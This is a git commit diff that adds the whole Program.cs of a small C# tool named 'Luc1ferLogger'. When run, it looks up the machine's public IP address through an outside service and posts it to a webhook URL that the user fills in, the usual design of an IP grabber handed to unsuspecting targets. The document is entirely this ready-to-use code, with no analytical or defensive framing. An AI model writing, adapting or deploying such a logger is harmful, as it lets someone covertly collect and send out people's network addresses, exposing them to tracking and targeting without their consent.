df30ac98de62d1c8d3689a789e2c14e10ee2ce0c
Luc1fer69 <70729562+Luc1fer69@users.noreply.github.com>
2020-09-04 17:59:53 +0200

    Update v1.0

---
+++ Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Specialized;
+using System.Net;
+using Luc1ferLogger;
+
+namespace Luc1ferLogger
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            string WebHookURL = "YOUR WEBHOOK URL HERE";
+            sendWebHook(WebHookURL, "```" + "IP: " + GetIP() + "```");
+        }
+
+        public static void sendWebHook(string URL, string msg)
+        {
+            Http.Post(URL, new NameValueCollection()
+            {
+                {
+                    "content",
+                    msg
+                }
+            });
+
+        }
+        public static string GetIP()
+        {
+            string IP = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
+            return IP;
+        }
+    }
+}
